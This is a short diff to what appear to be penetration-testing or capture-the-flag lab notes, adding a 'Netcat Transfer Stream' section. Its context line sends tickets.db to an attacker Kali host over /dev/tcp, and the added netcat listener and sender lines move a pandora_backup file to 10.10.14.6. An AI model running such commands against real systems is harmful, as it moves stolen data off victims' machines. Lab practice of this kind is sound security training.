@@ -13,3 +13,15 @@ const command = `cat tickets.db > /dev/tcp/${KaliIP}/2222`;
 
 dv.paragraph("```bash\n" + command + "\n```");
 ```
+
+---
+
+Netcat Transfer Stream
+
+```
+nc -nvlp 1234 > pandora_backup
+```
+
+```
+nc 10.10.14.6 1234 < pandora_backup
+```
